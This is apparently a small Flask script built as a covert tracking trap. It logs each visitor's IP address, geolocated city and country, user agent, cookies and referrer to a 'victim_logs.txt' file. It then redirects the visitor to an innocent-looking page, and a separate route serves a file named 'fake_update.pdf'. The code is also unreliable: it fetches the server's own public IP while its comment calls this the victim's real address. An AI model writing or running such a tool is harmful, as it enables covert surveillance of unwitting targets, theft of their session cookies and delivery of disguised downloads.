from flask import Flask, request, send_file, redirect
import datetime, requests

app = Flask(__name__)

LOG_FILE = "victim_logs.txt"

def log_to_file(data):
    with open(LOG_FILE, "a") as f:
        f.write(data + "\n")

@app.route('/')
def track():
    try:
        # Get the victim's real IPv4
        ipv4 = requests.get("https://api.ipify.org").text
    except:
        ipv4 = request.remote_addr

    ua = request.headers.get('User-Agent')
    cookie = request.headers.get('Cookie')
    ref = request.headers.get('Referer')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get Geo Info (Better IPv6 & IPv4 support)
    try:
        geo = requests.get(f"https://ipinfo.io/{ipv4}/json").json()
        location = f"{geo.get('city')}, {geo.get('region')}, {geo.get('country')}"
    except:
        location = "Unknown"

    log = f"""
[{now}]
IP Address: {ipv4}
Location: {location}
User-Agent: {ua}
Cookies: {cookie}
Referrer: {ref}
----------------------------------------
"""
    print(log)
    log_to_file(log)

    return redirect("https://jagdish-tripathy.vercel.app/")  # Your legit page

@app.route('/download')
def download():
    return send_file("fake_update.pdf", as_attachment=True)

app.run(host="0.0.0.0", port=8080)
